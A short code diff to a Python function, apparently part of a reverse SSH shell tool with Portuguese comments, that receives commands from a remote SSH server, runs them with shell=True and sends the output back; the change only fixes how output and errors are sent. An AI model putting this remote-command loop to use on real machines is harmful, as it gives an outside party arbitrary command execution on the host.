@@ -15,9 +15,9 @@ def ssh_command(ip, user, passwd, command):
             command = ssh_session.recv(1024)    # obtem o comando do servidor ssh
             try:
                 cmd_output = subprocess.check_output(command, shell=True)
-                ssh_session.send(cmd_output)
+                ssh_session.send(bytes(cmd_output))
             except Exception as err:
-                ssh_session.send('ERRO: ', str(err))
+                ssh_session.send(str(err))
         client.close()
     return
 
